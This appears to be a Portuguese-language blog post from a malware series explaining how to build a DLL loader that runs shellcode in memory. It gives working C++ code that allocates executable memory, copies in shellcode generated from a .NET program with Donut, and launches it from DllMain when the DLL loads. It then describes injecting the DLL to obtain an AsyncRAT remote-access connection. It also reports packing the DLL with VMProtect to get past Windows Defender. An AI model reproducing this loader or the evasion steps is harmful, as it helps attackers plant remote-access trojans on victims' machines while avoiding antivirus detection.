---
weight: 13
title: "Post XIII: Creating DLL Loader"
date: 2023-01-13T15:58:26+08:00
lastmod: 2023-01-13T15:58:26+08:00
draft: false
author: Vith0r
authorLink: https://github.com/Vith0r
description: Reverse Shell Simples.
images: 
resources:
  - name: featured-image
    src: Image.jpeg
tags:
  - Malware
categories:
  - Malware
lightgallery: true
toc:
  auto: false
---

## Podemos executar um programa na memória apartir de uma DLL?

A resposta é sim, podemos fazer isso, e não é muito difícil, Para isso, podemos usar um projeto que transforma nosso executável .NET em um binário. O nome do projeto é [Donut](https://github.com/TheWover/donut). sugiro olhar tudo que esse projeto faz, porque ele faz muito mais do que apenas converter o executável em binário.

> [!warning] Warning
> As informações que você encontrar neste post, técnicas, códigos, provas de conceito ou qualquer outra coisa são estritamente para fins educacionais.


![](https://telegra.ph/file/fa4b2d159e30a672d7efb.png)

Não precisamos nos preocupar muito com os argumentos por agora. Vamos primeiro converter o executável para binário.

![|750x372](https://telegra.ph/file/727c33bbaa4ad2cda179e.png)

Vamos agora copiar os bytes desse binário para poder colocá-los em nosso código. Podemos copiar o binário usando o [hxd](https://mh-nexus.de/en/hxd/).

![](https://telegra.ph/file/6e64e9d23fe900bdd1511.png)

## Código:
O código que vamos utilizar vai ser esse:

```cpp
#include <Windows.h>

unsigned char rawData[0] = { 0x00, 0x00, 0x00, 0x00 };

int main() {
    LPVOID exec_mem = VirtualAlloc(0, sizeof(rawData), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec_mem, rawData, sizeof(rawData));
    ((void(*)())exec_mem)();
    VirtualFree(exec_mem, sizeof(rawData), MEM_RELEASE);
    return 0;
}

#ifdef _WINDLL
BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved) {
    DisableThreadLibraryCalls(hInstance);
    switch (dwReason) {
        case DLL_PROCESS_ATTACH: {
            CreateThread(0, 0, (LPTHREAD_START_ROUTINE)main, 0, 0, 0);
            break;
        }
    }
    return TRUE;
}
#endif
```

---

Podemos testar para ver se isso está funcionando. Para isso, podemos usar o [Process-Hacker](https://processhacker.sourceforge.io/) apenas para injetar nossa Dll em um processo:

![](https://telegra.ph/file/3a90d684c298edcfa26dc.png)

Após ter injetado a DLL, vamos ter recebido uma conexão com o [AsyncRat](https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp):

![](https://telegra.ph/file/d0bf58d71841b7115aa4d.png)

Bom, que tal verificar se este simples código tem a capacidade de contornar o Windows Defender pelo menos:

![](https://telegra.ph/file/5f73cc4c1ce2d07e271a1.png)

Como podemos ver, ele detecta o arquivo facilmente. Como não é meu intuito aprofundar-me sobre a evasão de antivírus neste post, podemos apenas utilizar um software para proteger nossa DLL e verificar se conseguimos contornar o Windows Defender após proteger nossa DLL.
Para isso, estarei utilizando o VMProtect Professional:

![](https://telegra.ph/file/4ef02a9ee15091b70b232.png)

Agora vamos testar nossa Dll novamente e ver se contornamos o Windows Defender:

![](https://telegra.ph/file/75cb8713938e1cac4645d.png)

Como podemos ver, contornamos facilmente o Windows Defender!
Pode ser uma maneira simples de fazer isso, mas, de qualquer forma, funciona e é isso que importa.